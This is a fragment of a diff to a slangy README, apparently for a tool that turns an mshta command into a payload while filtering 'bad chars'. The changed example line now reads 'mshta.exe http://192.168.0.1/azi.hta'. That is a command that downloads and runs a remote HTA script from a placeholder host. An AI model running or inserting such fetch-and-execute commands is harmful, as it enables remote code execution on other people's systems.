@@ -49,7 +49,7 @@ To dodge the externally-managed-environment drama, we settin' up a virtual env. 
    ```
 
 2. Drop Your Inputs:
-   - mshta command: Like mshta.exe http://example.com.
+   - mshta command: Like mshta.exe http://192.168.0.1/azi.hta.
    - Bad chars: Comma-separated hex (e.g., 0a,0b). It always checks 0x00, no cap.
 
 3. Yeet Bad Chars:
